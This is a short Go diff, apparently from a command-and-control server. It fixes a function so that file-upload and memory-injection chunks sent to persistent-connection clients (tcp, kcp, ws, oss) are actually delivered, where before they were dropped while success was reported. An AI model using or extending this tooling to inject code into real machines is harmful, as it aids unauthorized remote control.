@@ -463,17 +463,13 @@ func SendFileUploadCommandChecked(uid string, byteToSend []byte) error {
 	return sendByProtocolErr(listenerType, uid, byteToSend, "文件上传")
 }
 
-// SendFileUploadCommandWithResult 发送已编码命令字节并返回是否成功（供注入分块校验，避免静默丢包）
+// SendFileUploadCommandWithResult 发送已编码命令字节并返回是否成功（布尔形式，等价于
+// SendFileUploadCommandChecked(...) == nil）。
+//
+// 【修复】原实现只对轮询/队列类型真正入队，对持久连接类型（tcp/kcp/ws/oss）仅做
+// "连接是否存在"的检查就返回 true，注释称"实际发送由 SendInjectMem 的循环保证"——
+// 但 SendInjectMem 的循环里唯一的动作就是调用本函数，于是对持久连接客户端做内存注入时
+// 分块全部丢失、调用方却拿到成功。现在统一走 sendByProtocolErr，真的发送并如实回报。
 func SendFileUploadCommandWithResult(uid string, byteToSend []byte) bool {
-	listenerType, exists := getListenerType(uid)
-	if !exists {
-		return false
-	}
-	// 轮询/队列类型：直接检查队列是否已满
-	if listenerType == "http" || listenerType == "https" || listenerType == "web" || listenerType == "dns" {
-		return command1.CommandQueues.AddCommand(uid, byteToSend)
-	}
-	// 持久连接类型：直接发送（sendByProtocol 内部处理连接），此处仅校验连接存在
-	// 为避免重复发送，这里仅做存在性检查，实际发送由 SendInjectMem 的循环保证
-	return true
+	return SendFileUploadCommandChecked(uid, byteToSend) == nil
 }
